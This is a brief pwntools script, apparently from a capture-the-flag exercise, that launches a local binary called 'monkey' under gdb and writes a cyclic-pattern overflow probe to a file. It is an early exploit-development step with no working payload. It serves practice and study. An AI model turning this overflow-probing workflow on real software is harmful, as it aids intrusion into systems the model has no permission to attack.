#!/bin/usr/python3
from pwn import *

# x32
# canary, NX enabled 
elf = context.binary = ELF("./monkey")
context.log_level = "info"
context.delete_corefiles = True
context.terminal = ["tmux", "split", "-h"]

# menu = 0x8048a53

def start():
	p = process("./monkey")
	gdb.attach(p, gdbscript = """
		b *0x8048a53
		continue
	""")	
	return p	

payload = b"1\n"
payload += b"a" + b"\x00" + cyclic(100)

f = open("./payload", "wb")
f.write(payload)
f.close()

p = start()
p.interactive()

